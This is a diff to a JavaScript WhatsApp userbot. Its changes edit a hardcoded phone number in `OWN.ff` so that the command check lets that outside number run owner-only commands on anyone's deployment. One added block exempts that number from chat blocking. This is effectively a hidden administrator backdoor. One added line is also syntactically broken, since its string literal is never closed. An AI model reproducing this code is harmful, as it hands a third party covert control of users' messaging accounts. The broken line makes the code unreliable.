@@ -36,7 +36,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
     }
 });
 
-var OWN = { ff: ',0,919400846679' }
+var OWN = { ff: '919400846679,0' }
 const plugindb = require('./plugins/sql/plugin');
 
 String.prototype.format = function () {
@@ -72,6 +72,7 @@ async function Alexa () {
     const conn = new WAConnection();
     const Session = new StringSession();
     conn.version = [2, 2126, 14]
+    conn.setMaxListeners(0);
 
     conn.logger.level = config.DEBUG ? 'debug' : 'warn';
     var nodb;
@@ -375,10 +376,13 @@ ${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
             var abc = config.BLOCKCHAT.split(',');                            
             if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
+
+      if (!message.jid == '919400846679) {
         if (config.SUPPORT == '94768826133-1630756178') {     
             var sup = config.SUPPORT.split(',');                            
             if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
+      }
 
         events.commands.map(
             async (command) =>  {
@@ -414,7 +418,7 @@ ${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == ",0,919400846679" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "919400846679,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
